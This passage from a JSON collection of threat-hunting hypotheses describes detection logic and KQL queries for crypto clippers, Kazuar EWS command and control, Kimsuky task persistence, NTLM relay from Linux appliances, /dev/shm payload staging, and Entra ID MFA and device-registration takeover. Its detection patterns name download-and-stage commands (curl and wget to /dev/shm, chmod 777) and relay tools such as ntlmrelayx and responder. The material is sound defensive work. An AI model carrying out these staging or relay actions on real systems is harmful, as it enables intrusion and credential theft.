    "references": "- [MITRE ATT&CK T1556.002 - Modify Authentication Process: Password Filter DLL](https://attack.mitre.org/techniques/T1556/002/)\n- [Microsoft Security Blog - Undermining the Trust Boundary: Investigating a Stealthy Intrusion Through Third-Party Compromise](https://www.microsoft.com/en-us/security/blog/2026/05/12/undermining-the-trust-boundary-investigating-a-stealthy-intrusion-through-third-party-compromise/)\n- [SigmaHQ - Dropping Of Password Filter DLL (Notification Packages registry add)](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_reg_credential_access_via_password_filter/)\n- [Microsoft Learn - Installing and Registering a Password Filter DLL](https://learn.microsoft.com/en-us/windows/win32/secmgmt/installing-and-registering-a-password-filter-dll)\n- [PentestLab - Credential Access: Password Filter DLL](https://pentestlab.blog/2020/02/10/credential-access-password-filter-dll/)\n- [Red Canary Atomic Red Team - T1556.002 Password Filter DLL](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.002/T1556.002.md)\n- [nFront Security - Monitoring for Malicious Password Filters](https://nfrontsecurity.com/blog/monitoring-for-malicious-password-filters/)",
    "file_path": "Flames/H157.md"
  },
  {
    "id": "H158",
    "category": "Flames",
    "title": "Information stealers (Gremlin Stealer, Laplas Clipper, and variants) are running a persistent thread that polls the Windows clipboard for cryptocurrency wallet patterns and replaces matched strings with an attacker-controlled wallet address before the victim pastes — `SetClipboardData` is called by a foreign process with the same handle the user just copied to.",
    "tactic": "Collection",
    "notes": "Windows. Unit 42 Gremlin Stealer evolution report (May 2026) — \"Crypto clipper functionality continuously monitors the system clipboard for strings matching cryptocurrency wallet patterns…replaces the victim's address with the attacker's wallet.\" Detection: Sysmon Event ID 24 (ClipboardChange) — baseline the small set of legitimate clipboard writers (`explorer.exe`, browsers, password managers, Office apps, RDP/Teams clients) and alert on writes from any other process, especially from `%AppData%`, `%LocalAppData%`, `%Temp%`, or ProgramData paths. Sysmon Event ID 1 for short-lived processes that immediately spawn clipboard activity. Specific anchor: two `Event ID 24` events within the same second from different processes for what appears to be the same content position (user copy → stealer write) — the second write is the replacement. ETW `Microsoft-Windows-Win32k` clipboard events as a fallback when Sysmon is not deployed. KQL (Defender XDR): `DeviceEvents | where ActionType has \"Clipboard\"` (where available). Cross-reference T1027 (Obfuscated Files/Info) — Gremlin Stealer also hides its payload in XOR-encoded .NET resource sections. Note: Sysmon clipboard capture has performance overhead and must be enabled with `<ClipboardChange onmatch=\"include\">` rules — define narrowly.",
    "tags": [
      "collection",
      "crypto_clipper",
      "gremlin_stealer",
      "laplas",
      "windows",
      "T1027",
      "T1115"
    ],
    "techniques": [
      "T1027",
      "T1115"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Crypto clippers are a high-volume, low-sophistication threat that bypasses every traditional credential and data-loss control — the user willingly pastes the wrong wallet address; no exfil channel is needed and no credential is touched, so they evade DLP, EDR memory scans, and network monitoring entirely\n- The only reliable detection point is the clipboard write itself — Sysmon Event ID 24 (added in v12) is purpose-built for this and most organizations either have not deployed it or have not configured the include rules to capture clipboard changes at all\n- Gremlin Stealer (Unit 42, May 2026) is the second major stealer family in 12 months to add a dedicated clipper module — the technique is becoming standard in the commodity stealer market, so hunts built for one family generalize cleanly to the rest (Laplas, RedLine variants, ClipboardWalletHijacker)\n- After a one-time baseline of legitimate clipboard writers, alerting on writes from any process in user-writable paths (AppData, Temp, ProgramData) catches every clipper without needing a wallet-pattern signature — pattern signatures are brittle (every coin has a different regex) but writer-process anomalies are not",
    "references": "- [MITRE ATT&CK T1115 - Clipboard Data](https://attack.mitre.org/techniques/T1115/)\n- [Unit 42 - Gremlin Stealer's Evolved Tactics: Hiding in Plain Sight With Resource Files](https://unit42.paloaltonetworks.com/gremlin-stealer-evolution/)\n- [TrustedSec - Sysmon Community Guide: Clipboard Capture (EventID 24)](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/clipboard-capture.md)\n- [Olaf Hartong / FalconForce - Sysmon 12.0 EventID 24 Deep Dive](https://medium.com/falconforce/sysmon-12-0-eventid-24-31e0109c78e3)\n- [Hunt.io - Laplas Clipper: Cryptocurrency Clipboard Hijacker Threat](https://hunt.io/malware-families/laplas-clipper)\n- [Red Canary Atomic Red Team - T1115 Clipboard Data](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1115/T1115.md)\n- [BleepingComputer - Microsoft Sysmon Now Logs Data Copied to the Windows Clipboard](https://www.bleepingcomputer.com/news/microsoft/microsoft-sysmon-now-logs-data-copied-to-the-windows-clipboard/)",
    "file_path": "Flames/H158.md"
  },
  {
    "id": "H159",
    "category": "Flames",
    "title": "Kazuar operators are using Exchange Web Services (EWS) as a covert command-and-control channel — `CreateItem`, `FindItem`, `GetItem`, `UpdateItem`, and `DeleteItem` SOAP operations against `/EWS/Exchange.asmx` from a compromised mailbox carry tasking and exfiltration data, blending in with legitimate Outlook traffic.",
    "tactic": "Command and Control",
    "notes": "Windows / M365 / Exchange Online. Microsoft Threat Intelligence Kazuar nation-state botnet report (May 2026) — \"Exchange Web Services (EWS), HTTP, WebSockets (WSS)\" used for redundant C2. Detection: `CloudAppEvents` for EWS operations with unusual `UserAgent` strings (Kazuar does not present as Outlook/MAPI client UAs); baseline expected EWS clients per tenant (Outlook desktop, mobile Outlook, third-party mail clients) and alert on outliers. Specific EWS operations to focus on: `CreateItem` + `UpdateItem` on the SAME item within seconds (read-write tasking pattern); `FindItem` against `Drafts` or custom folders with low-volume but periodic cadence; high item-count drafts that never get sent. `DeviceNetworkEvents` for outbound HTTPS to `/EWS/Exchange.asmx` from processes that are NOT `outlook.exe`, `msteams.exe`, `lync.exe`, or known mail-sync agents — Kazuar runs inside an injected process tree so the initiator will look anomalous. Microsoft Unified Audit Log: `MailItemsAccessed`, `Update`, `New-InboxRule` with unusual frequency from low-activity accounts. KQL: `CloudAppEvents | where Application has \"Exchange\" and ActionType in~ (\"FindItem\",\"CreateItem\",\"UpdateItem\") and UserAgent !has \"Outlook\" and UserAgent !has \"Microsoft Office\"`. Cross-reference T1114.002 (Email Collection: Remote Email Collection) — the same EWS API is used for mail theft and for tasking. Cross-reference T1102 (Web Service) — Kazuar's WSS fallback channel.",
    "tags": [
      "command_and_control",
      "kazuar",
      "ews",
      "exchange",
      "m365",
      "T1114.002",
      "T1102",
      "T1071.003"
    ],
    "techniques": [
      "T1114.002",
      "T1102",
      "T1071.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Mail-protocol C2 is one of the hardest channels to detect because EWS traffic to Exchange Online is universally present and is allowed through every egress filter — Kazuar deliberately chose it as a redundancy channel for exactly this reason\n- Microsoft's May 2026 Kazuar writeup names EWS as a first-class C2 mechanism alongside HTTP and WebSockets — combined with the actor's nation-state attribution, this is a high-confidence forward-looking technique that other APTs will adopt\n- The detection logic does not depend on signatures of Kazuar — it depends on EWS access patterns (initiator process, user agent, operation cadence, item lifecycle) that any mail-protocol C2 implant will exhibit, so the hunt generalizes to APT29's MAPI C2, Hafnium's EWS abuse, and future variants\n- M365 Unified Audit Log + CloudAppEvents are already collected by most tenants — the hunt is largely a query-tuning exercise, not a telemetry-deployment exercise, which makes it cheap to implement",
    "references": "- [MITRE ATT&CK T1071.003 - Application Layer Protocol: Mail Protocols](https://attack.mitre.org/techniques/T1071/003/)\n- [Microsoft Security Blog - Kazuar: Anatomy of a Nation-State Botnet](https://www.microsoft.com/en-us/security/blog/2026/05/14/kazuar-anatomy-of-a-nation-state-botnet/)\n- [Microsoft Security Blog - Stopping Attacks Against On-Premises Exchange Server with AMSI (EWS abuse patterns)](https://www.microsoft.com/en-us/security/blog/2025/04/09/stopping-attacks-against-on-premises-exchange-server-and-sharepoint-server-with-amsi/)\n- [MITRE ATT&CK T1114.002 - Email Collection: Remote Email Collection](https://attack.mitre.org/techniques/T1114/002/)\n- [Microsoft Learn - Control Access to EWS in Exchange Online](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-control-access-to-ews-in-exchange)\n- [PT SWARM - Attacking MS Exchange Web Interfaces (EWS surface)](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)\n- [OWASP Frankfurt - Abusing Cloud Apps 101: Command and Control](https://owasp.org/www-chapter-frankfurt/assets/slides/56_OWASP_Frankfurt_Stammtisch_2.pdf)",
    "file_path": "Flames/H159.md"
  },
  {
    "id": "H160",
    "category": "Flames",
    "title": "Kimsuky (DPRK) is persisting PebbleDash / AppleSeed implants on Windows hosts by creating scheduled tasks named `ChromeCheck` (elevated) or `EdgeCheck` (non-elevated) that invoke `regsvr32 /s <path>` every minute — disguising the persistence under browser-update branding.",
    "tactic": "Persistence",
    "notes": "Windows. Securelist Kimsuky PebbleDash campaign report (May 2026). Detection: Windows Security Event ID 4698 (scheduled task created) where TaskName is `ChromeCheck`, `EdgeCheck`, `GoogleCache`, `GoogleUpdate`, or other browser-update-masquerading names AND the task action invokes `regsvr32` with `/s` (silent). Sysmon Event ID 1 / `DeviceProcessEvents` for `schtasks.exe /create /tn ChromeCheck` or `/tn EdgeCheck` with `/tr` containing `regsvr32` or `wscript`. Sysmon Event ID 1 for `regsvr32.exe /s` with parent `svchost.exe -k netsvcs` (Task Scheduler) and a child loading a DLL or .cfg from `%ProgramData%\\Chrome\\`, `%LocalAppData%\\FoxitReader\\`, or other user-writable paths. KQL (Defender XDR): `DeviceProcessEvents | where FileName =~ \"schtasks.exe\" and ProcessCommandLine has_any (\"ChromeCheck\",\"EdgeCheck\",\"GoogleCache\",\"GoogleUpdate\") and ProcessCommandLine has \"regsvr32\"`. KQL (regsvr32 via Task Scheduler): `DeviceProcessEvents | where InitiatingProcessFileName =~ \"svchost.exe\" and FileName =~ \"regsvr32.exe\" and ProcessCommandLine has \"/s\" and ProcessCommandLine matches regex @\"\\.(cfg|db|dat|xml)\"`. Network indicator: outbound HTTPS to `*.trycloudflare.com`, `*.p-e.kr`, `*.o-r.kr`, or `*.n-e.kr` from the regsvr32 host within 5 minutes. Cross-reference T1218.010 (Regsvr32) — the execution side of this persistence anchor. Cross-reference T1071.001 (Application Layer Protocol: Web Protocols) — Kimsuky's HTTP POST C2 with `m=`, `u=`, `d=` parameters.",
    "tags": [
      "persistence",
      "kimsuky",
      "appleseed",
      "pebbledash",
      "regsvr32",
      "windows",
      "T1218.010",
      "T1071.001",
      "T1053.005"
    ],
    "techniques": [
      "T1218.010",
      "T1071.001",
      "T1053.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The task names `ChromeCheck` and `EdgeCheck` are exact, campaign-specific strings that Kimsuky has reused across multiple PebbleDash and AppleSeed waves (Securelist May 2026; ASEC historical reporting on `GoogleCache` / `GoogleUpdate`) — name-based detection is a near-zero-FP first pass because legitimate Chrome/Edge updaters use service names, not user-created tasks\n- Pairing the task name with the `regsvr32 /s <unusual extension>` action catches the technique even when Kimsuky renames the task — `regsvr32` loading a `.cfg`, `.db`, `.dat`, or `.xml` from `%ProgramData%` or `%LocalAppData%` is rare in benign software and almost universal in this campaign family\n- A 1-minute trigger interval on a task that calls `regsvr32` generates very loud telemetry once detection is wired up — defenders who instrument this hunt will see the persistence within minutes of infection, not days\n- Kimsuky has been operating PebbleDash since 2018 and pivots through new lures and droppers every campaign — but the scheduled-task + regsvr32 + browser-named-task triad has remained stable, making this one of the most cost-effective hunts in the Kimsuky kill chain",
    "references": "- [MITRE ATT&CK T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)\n- [Securelist - Disclosing New PebbleDash-Based Tools by Kimsuky](https://securelist.com/kimsuky-appleseed-pebbledash-campaigns/119785/)\n- [ASEC - APT Attack Cases of Kimsuky Group (PebbleDash)](https://asec.ahnlab.com/en/30022/)\n- [ASEC - Analysis Report on Kimsuky Group's APT Attacks (AppleSeed, PebbleDash)](https://asec.ahnlab.com/en/30532/)\n- [MITRE ATT&CK T1218.010 - System Binary Proxy Execution: Regsvr32](https://attack.mitre.org/techniques/T1218/010/)\n- [SigmaHQ - Suspicious Scheduled Task Creation Involving Temp Folder](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security/win_security_susp_schtask_creation_temp_folder.yml)\n- [Red Canary Atomic Red Team - T1053.005 Scheduled Task](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md)",
    "file_path": "Flames/H160.md"
  },
  {
    "id": "H161",
    "category": "Flames",
    "title": "An attacker on a compromised Linux host (Confluence or F5 BIG-IP) is performing NTLM relay coercion against an internal Windows domain controller — running `responder`, `ntlmrelayx`, `kerbrute`, or a CVE-2025-33073 PoC to coerce and relay authentication for credential theft and lateral movement.",
    "tactic": "Credential Access",
    "notes": "Linux source, Windows AD impact. Microsoft Security Blog \"From edge appliance to enterprise compromise\" (May 2026) — F5/Confluence intrusion using CVE-2025-33073. Detection sources: Linux: `auditd` `execve` rules for `responder`, `ntlmrelayx`, `kerbrute`, `nxc` (NetExec), `impacket-*`, `dnstool.py`; Defender for Endpoint DeviceProcessEvents where `FileName in (\"python\",\"python3\",\"responder\",\"kerbrute\",\"nxc\",\"ntlmrelayx.py\")` and `ProcessCommandLine has_any (\"-r\",\"--target\",\"relay\",\"CVE-2025-33073\",\"SMBSERVER\",\"HTTPSERVER\")`. Network: Linux→DC connections on TCP 445 (SMB), 88 (Kerberos), 389/636 (LDAP), 5985/5986 (WinRM), or 80/443 with SPN/HTTP coercion — these are unusual from a Confluence/F5 host. Pair with Windows Security Event ID 4624 logon type 3 to a DC with source IP = Linux appliance/Confluence host. Windows Event ID 4625 failures with `Failure Reason: Unknown user name or bad password` and `Source Workstation` = Linux hostname (Responder NTLMv2 challenge collection). KQL: `DeviceNetworkEvents | where DeviceName has_any (\"confluence\",\"bigip\",\"f5\") and RemotePort in (445,88,389,636) | join (DeviceInfo | where MachineGroup has \"Domain Controllers\") on $left.RemoteIP == $right.IPAddresses`. Cross-reference T1557 (AiTM relay infrastructure on the same host), T1110.003 (Password Spraying via kerbrute), and T1190 (Exploit Public-Facing Application — Confluence/F5 RCE that enabled the position).",
    "tags": [
      "credential_access",
      "ntlm_relay",
      "cve_2025_33073",
      "linux",
      "confluence",
      "f5",
      "T1557",
      "T1110.003",
      "T1190",
      "T1187"
    ],
    "techniques": [
      "T1557",
      "T1110.003",
      "T1190",
      "T1187"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Linux edge appliances (F5 BIG-IP, Confluence, BIG-IQ) and DMZ Linux jump hosts are an emerging staging pattern for NTLM relay — the attacker bypasses Windows-side EDR and uses Linux as a \"blind spot\" to run `responder`, `ntlmrelayx`, and PetitPotam-style coercion tools (Microsoft, May 2026); historically this tradecraft lived on attacker-controlled VMs, but now lives on the victim's own appliances\n- CVE-2025-33073 (June 2025) removed the prior requirement that relay attacks needed admin access on the relayer — making coerced NTLM authentication a near-universal post-RCE pivot from any internet-facing Linux host with a path to the internal network (Synacktiv, Praetorian, Zero Networks deep dives)\n- The detection signal is extremely high-fidelity: **Confluence and F5 management hosts should never connect to a DC on SMB/Kerberos/LDAP** — these are management or web-tier devices, not domain-joined endpoints. Any 445/88/389 connection from an internet-facing Linux host to a DC IP is anomaly-by-baseline and worth chasing every time\n- Pairing the network signal with `auditd` process telemetry catches both the tool execution (responder/kerbrute binaries) AND the in-memory Python relay (`impacket` libraries via `python3`) — closing the gap where attackers rename or strip tool binaries",
    "references": "- [MITRE ATT&CK T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/)\n- [Microsoft Security Blog - From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence](https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/)\n- [Synacktiv - NTLM reflection is dead, long live NTLM reflection (CVE-2025-33073 in-depth)](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)\n- [Praetorian - CVE-2025-33073 NTLM Reflection One-Hop](https://www.praetorian.com/blog/cve-2025-33073-ntlm-reflection-one-hop/)\n- [Zero Networks - Examining Relay Attacks Through the Lens of CVE-2025-33073](https://zeronetworks.com/blog/examining-relay-attacks-through-the-lens-of-cve-2025-33073)\n- [SOC Prime - PetitPotam NTLM Relay Attack Detection](https://socprime.com/blog/petitpotam-ntlm-relay-attack-detection/)\n- [MITRE ATT&CK T1557 - Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)",
    "file_path": "Flames/H161.md"
  },
  {
    "id": "H162",
    "category": "Flames",
    "title": "A compromised Linux web service (Confluence/Java, F5 management) is staging a payload in `/dev/shm` or `/tmp` by performing `chmod 777` on the directory or file — enabling execution of a downloaded second-stage binary from a world-writable, RAM-backed location that survives no reboots but defeats common executable-path allowlists.",
    "tactic": "Defense Evasion",
    "notes": "Linux. Microsoft Security Blog \"From edge appliance to enterprise compromise\" (May 2026). Detection sources: auditd rule `-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F auid>=1000 -k perm_mod` filtering on path `/dev/shm` or `/tmp` and mode `0777`/`0755`. Defender for Endpoint KQL (from source article): `DeviceProcessEvents | where InitiatingProcessFileName == \"java\" | where ProcessCommandLine has_any(\"chmod 777 /dev/shm\",\"chmod 777 /tmp\",\"base64 -d > /dev/shm\",\"curl -o /dev/shm/\",\"wget -O /dev/shm/\",\"wget -O /tmp/\")`. Falco rule `Write below /dev/shm` and `Mkdir binary dirs`. eBPF/Sysdig capture of `execve(\"/usr/bin/chmod\",\"777\",\"/dev/shm/...\")` with parent `java`, `httpd`, `nginx`, or `tomcat`. Pair with the immediate next child process — a binary executed FROM `/dev/shm/` or `/tmp/` within 60 seconds (Sysmon-for-Linux Event ID 1 with `Image` starting with `/dev/shm/` or `/tmp/`). Cross-reference T1059.004 (Unix Shell) and T1105 (Ingress Tool Transfer) — the chmod is the connective tissue between the download and the execute. Cross-reference T1036.005 (Match Legitimate Name) — staged binaries often named to mimic system tools (e.g., `/dev/shm/systemd-update`, `/tmp/dbus-daemon`).",
    "tags": [
      "defense_evasion",
      "linux",
      "chmod",
      "dev_shm",
      "tmp",
      "confluence",
      "f5",
      "T1059.004",
      "T1105",
      "T1036.005",
      "T1222.002"
    ],
    "techniques": [
      "T1059.004",
      "T1105",
      "T1036.005",
      "T1222.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The Microsoft May 2026 F5/Confluence intrusion writeup lists `chmod 777 /dev/shm` and `chmod 777 /tmp` as direct attacker commands — these are not commands a Java application server runs in normal operation, so the `parent_process=java + chmod 777 /dev/shm` pairing is a near-zero-FP signal\n- `/dev/shm` is RAM-backed (`tmpfs`), so files placed there leave no on-disk forensic trail after reboot — making it the preferred staging directory for in-memory loaders, fileless payloads, and credentials staging. Defenders who do not monitor `tmpfs` writes are blind to this\n- Legitimate users rarely need `0777` on `/dev/shm` or `/tmp` — those directories already have the sticky bit and world-writable permissions at the directory level. A `chmod 777` operation on a specific file inside them is a strong adversary signal because attackers do it to defeat per-user umask defaults on dropped payloads\n- Coupling the `chmod 777` event with the very next `execve` from the same directory yields full attack-chain visibility: download → permission-change → execute, all from a Linux service that should never originate any of these calls",
    "references": "- [MITRE ATT&CK T1222.002 - File and Directory Permissions Modification: Linux and Mac](https://attack.mitre.org/techniques/T1222/002/)\n- [Microsoft Security Blog - From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence](https://www.microsoft.com/en-us/security/blog/2026/05/22/from-edge-appliance-to-enterprise-compromise-multi-stage-linux-intrusion-via-f5-and-confluence/)\n- [Red Canary Atomic Red Team - T1222.002 Linux File and Directory Permissions Modification](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.002/T1222.002.md)\n- [Falco - Falco Rules for /dev/shm and /tmp Writes](https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml)\n- [Elastic Security - Suspicious chmod in Temporary Folder](https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_chmod_executable_in_world_writeable_dir.toml)\n- [MITRE ATT&CK T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)\n- [Sigma - Linux File Permission Modification Detection](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_susp_file_chmod.yml)",
    "file_path": "Flames/H162.md"
  },
  {
    "id": "H163",
    "category": "Flames",
    "title": "After a successful Self-Service Password Reset (SSPR) on an Entra ID account, an adversary is removing the user's legitimate MFA methods (Authenticator app, phone, FIDO key) and registering a new attacker-controlled MFA method in the same session — completing a full identity takeover that survives password rotation and bypasses conditional access that trusts \"MFA-registered\" devices.",
    "tactic": "Persistence",
    "notes": "M365 / Entra ID. Microsoft Security Blog \"How Storm-2949 turned a compromised identity into a cloud-wide breach\" (May 2026). Detection sources: Entra ID Audit Logs (Defender XDR `AuditLogs` / Sentinel `AuditLogs`) operations: `Reset password (self-service)`, `User registered security info`, `User deleted security info`, `User changed default security info`. Sign-in Logs (`SigninLogs`) joined by `UserPrincipalName` and `CorrelationId`. KQL: `AuditLogs | where TimeGenerated > ago(7d) | where OperationName in (\"User registered security info\",\"User deleted security info\",\"Reset password (self-service)\") | extend Target = tostring(TargetResources[0].userPrincipalName) | summarize Ops=make_set(OperationName), Times=make_list(TimeGenerated), IPs=make_set(InitiatedBy.user.ipAddress) by Target, CorrelationId | where Ops has \"User deleted security info\" and Ops has \"User registered security info\" and Ops has \"Reset password (self-service)\"`. Pair with SigninLogs anomaly: post-reset sign-in from a different `IPAddress`, `Country`, or `UserAgent` than the 30-day baseline. Pair with risky users: `IdentityProtection.RiskyUsers` and `UserRiskEvents` flagged within ±6h. Cross-reference T1621 (MFA Request Generation — the upstream MFA fatigue that often precedes the swap), T1098.005 (Device Registration — attackers typically register their device after MFA swap), and T1078.004 (Cloud Accounts — the valid-account abuse that follows).",
    "tags": [
      "persistence",
      "entra_id",
      "m365",
      "mfa",
      "sspr",
      "storm_2949",
      "T1621",
      "T1098.005",
      "T1078.004",
      "T1556.006"
    ],
    "techniques": [
      "T1621",
      "T1098.005",
      "T1078.004",
      "T1556.006"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Storm-2949 (Microsoft, May 2026) and prior actors (Midnight Blizzard, Storm-0501) all converge on the same MFA-swap-after-SSPR pattern because it produces a fully-authenticated identity that survives password rotation, defeats user-notification of \"new device sign-in,\" and looks identical to a legitimate forgotten-password flow in Entra\n- The three audit operations — `Reset password (self-service)` + `User deleted security info` + `User registered security info` — happening on the **same UPN** within a **single session/correlation ID** is a high-fidelity composite signal. Legitimate users almost never delete *and* re-add MFA factors in the same session as a self-service reset; they typically add a new factor without deleting the old\n- Hunters using only the password-reset event miss the persistence step; hunters using only the MFA-registration event miss the takeover step. The composite query is the only way to surface the full chain in a single pivot\n- Conditional access policies that trust \"MFA-registered devices\" or \"compliant devices\" become a persistence enabler once the attacker owns the MFA factor — so this hunt is also a feed-in to a periodic review of CA assignments for accounts with recent MFA swaps",
    "references": "- [MITRE ATT&CK T1556.006 - Modify Authentication Process: Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006/)\n- [MITRE ATT&CK T1621 - Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621/)\n- [Microsoft Security Blog - How Storm-2949 turned a compromised identity into a cloud-wide breach](https://www.microsoft.com/en-us/security/blog/2026/05/18/storm-2949-turned-compromised-identity-into-cloud-wide-breach/)\n- [Microsoft Community Hub - Hunting for MFA manipulations in Entra ID tenants using KQL](https://techcommunity.microsoft.com/blog/microsoftsecurityexperts/hunting-for-mfa-manipulations-in-entra-id-tenants-using-kql/4154039)\n- [Red Canary Threat Detection Report - MFA Request Generation](https://redcanary.com/threat-detection-report/techniques/mfa-request-generation/)\n- [Elastic Detection Rules - Successful Azure AD MFA Fatigue Attack](https://github.com/elastic/detection-rules/issues/2440)\n- [Jeffrey Appel - How to Mitigate MFA Fatigue and Learn from the Uber Breach](https://jeffreyappel.nl/how-to-prevent-mfa-fatigue-and-learn-from-the-uber-breach-for-additional-protection/)",
    "file_path": "Flames/H163.md"
  },
  {
    "id": "H164",
    "category": "Flames",
    "title": "An adversary with stolen Entra ID credentials is registering an attacker-controlled device in the tenant using ROADtools `roadtx` — visible in audit logs as a `Register device` operation from `Device Registration Service`, with a `Microsoft.OData.Client` user agent, a default OS string of `Windows 10.0.19041.928`, and a hostname matching `DESKTOP-<8 digits>` — enabling Primary Refresh Token (PRT) acquisition and conditional-access bypass for \"trusted device\" policies.",
    "tactic": "Persistence",
    "notes": "M365 / Entra ID. Unit 42 \"Paved With Intent: ROADtools and Nation-State Tactics in the Cloud\" (May 2026, attributed to Curious Serpens / Iranian APT). Detection sources: Entra ID Audit Logs `AuditLogs` table — operations `Add device`, `Register device`, `Add registered owner to device`, `Add registered user to device` where `LoggedByService == \"Device Registration Service\"`. Sign-in Logs (`SigninLogs`) joined by `CorrelationId` — look for `UserAgent has_any (\"Microsoft.OData.Client\",\"python-requests\",\"aiohttp\",\"urllib\")` against `AppDisplayName in (\"Device Registration Service\",\"Microsoft Authentication Broker\")`. KQL (composite): `AuditLogs | where OperationName in (\"Add device\",\"Register device\") and LoggedByService == \"Device Registration Service\" | extend DeviceName = tostring(TargetResources[0].displayName), DeviceOS = tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[0].newValue) | where DeviceName matches regex @\"^DESKTOP-[0-9]{8}$\" or DeviceOS has \"10.0.19041.928\" | join kind=leftouter SigninLogs on CorrelationId | where UserAgent has_any (\"Microsoft.OData.Client\",\"python-requests\",\"aiohttp\")`. AADGraphActivityLogs: hunt for `UserAgent has \"Microsoft.OData.Client\"` or `UserAgent has \"aiohttp\"` — these are ROADtools' default. Pair with subsequent token issuance (`SigninLogs` where `AuthenticationProtocol == \"deviceCode\"` or `ResourceDisplayName == \"Microsoft Graph\"`) and Graph API enumeration bursts against `/users`, `/groups`, `/devices`, `/servicePrincipals` from the new device. Cross-reference T1078.004 (Cloud Accounts — the stolen identity that enables registration), T1098.001 (Additional Cloud Credentials — service principal cred adds that often follow), and T1550.001 (Application Access Token — the PRT-based reuse).",
    "tags": [
      "persistence",
      "entra_id",
      "m365",
      "roadtools",
      "prt",
      "curious_serpens",
      "T1078.004",
      "T1098.001",
      "T1550.001",
      "T1098.005"
    ],
    "techniques": [
      "T1078.004",
      "T1098.001",
      "T1550.001",
      "T1098.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- ROADtools' default registration values — OS `10.0.19041.928`, hostname `DESKTOP-<8 random digits>`, user agent `Microsoft.OData.Client` — are **trivially modifiable** by the attacker, but in the wild a striking percentage of operators leave them as defaults because their goal is fast PRT acquisition, not OPSEC. Hunters who key on the default fingerprint catch a meaningful slice of real attacks at near-zero cost\n- A successful device registration grants the attacker a **Primary Refresh Token (PRT)** — which can be used to silently acquire access tokens for Microsoft Graph, Outlook, SharePoint, and any app trusted by Entra. PRT abuse is invisible in user sign-in logs after the initial registration, so catching the **registration event** is the only reliable choke point\n- The audit-log → sign-in-log → Graph-API-burst sequence (Unit 42, May 2026 Curious Serpens; Elastic detection-rules `entra_id_device_registration_detected_roadtools`) is a tight temporal pattern — within ~5 minutes of the device add, the attacker queries Graph for users/groups/apps. Joining the three telemetry sources by `CorrelationId` or by user+time-window produces a high-fidelity composite signal\n- Many tenants have Conditional Access policies that grant elevated trust to devices in a \"compliant\" or \"Hybrid Azure AD Joined\" state. Once an attacker registers a device, follow-on policies that look at \"device-registered\" alone (without compliance/MDM enrollment) become persistence enablers — making this hunt also a forcing function to audit CA grants around device state",
    "references": "- [MITRE ATT&CK T1098.005 - Account Manipulation: Device Registration](https://attack.mitre.org/techniques/T1098/005/)\n- [Unit 42 - Paved With Intent: ROADtools and Nation-State Tactics in the Cloud](https://unit42.paloaltonetworks.com/roadtools-cloud-attacks/)\n- [Elastic Security - Entra ID Device Registration Detected (ROADtools)](https://www.elastic.co/guide/en/security/current/entra-id-device-registration-detected-roadtools.html)\n- [Elastic Security - Entra ID Unusual Cloud Device Registration](https://www.elastic.co/guide/en/security/8.19/entra-id-unusual-cloud-device-registration.html)\n- [Detection.FYI - Entra ID Unusual Cloud Device Registration](https://detection.fyi/elastic/detection-rules/integrations/azure/persistence_entra_id_suspicious_cloud_device_registration/)\n- [Cloudbrothers - AADGraphActivityLogs: ROADtools and Legacy Graph Detection](https://cloudbrothers.info/en/aadgraphactivitylogs/)\n- [Invictus IR - AADGraphActivityLogs: How to Detect Legacy Azure AD Graph Attacks](https://www.invictus-ir.com/news/the-missing-link-aadgraphactivitylogs-finally-arrives)",
    "file_path": "Flames/H164.md"
  },
  {
    "id": "H165",
    "category": "Flames",
